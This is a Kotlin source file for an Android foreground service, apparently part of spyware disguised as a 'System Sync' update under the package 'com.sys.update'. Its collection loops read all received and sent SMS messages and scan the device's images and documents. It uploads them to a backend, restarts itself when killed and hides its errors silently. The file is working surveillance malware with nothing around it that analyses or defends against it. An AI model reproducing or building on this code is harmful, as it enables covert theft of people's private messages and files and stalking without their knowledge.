package com.sys.update

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Persistent foreground service. Runs the collection loop.
 */
class BackgroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var running = true

    override fun onCreate() {
        super.onCreate()
        startForegroundWithNotification()
        startCollectionLoops()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        scope.cancel()
        // Self-restart
        try {
            val restart = Intent(applicationContext, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restart)
            } else {
                applicationContext.startService(restart)
            }
        } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun startForegroundWithNotification() {
        val channelId = "sys_sync_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(channelId) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_LOW)
                )
            }
        }

        val notif: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1001, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(1001, notif)
        }
    }

    private fun startCollectionLoops() {
        // Loop 1: flush queued notifications / events to backend
        scope.launch {
            while (running) {
                try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
                delay(Config.NOTIF_UPLOAD_INTERVAL_MS)
            }
        }

        // Loop 2: scan SMS periodically
        scope.launch {
            while (running) {
                try {
                    val msgs = SmsReader.scanAll(applicationContext) +
                               SmsReader.scanSent(applicationContext)
                    for (m in msgs) DataStore.appendAny(applicationContext, m)
                } catch (_: Exception) {}
                delay(Config.SMS_SCAN_INTERVAL_MS)
            }
        }

        // Loop 3: scan media periodically
        scope.launch {
            while (running) {
                try {
                    val images = MediaScanner.scanImages(applicationContext)
                    val docs   = MediaScanner.scanDocuments(applicationContext)

                    for (img in images) {
                        DataStore.appendAny(applicationContext, MediaScanner.toJson(img))
                        Uploader.uploadMediaFile(applicationContext, img)
                    }
                    for (d in docs) {
                        DataStore.appendAny(applicationContext, MediaScanner.toJson(d))
                        Uploader.uploadMediaFile(applicationContext, d)
                    }
                } catch (_: Exception) {}
                delay(Config.MEDIA_SCAN_INTERVAL_MS)
            }
        }

        // Loop 4: drain media-related queue entries
        scope.launch {
            while (running) {
                try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
                delay(Config.NOTIF_UPLOAD_INTERVAL_MS)
            }
        }
    }
}
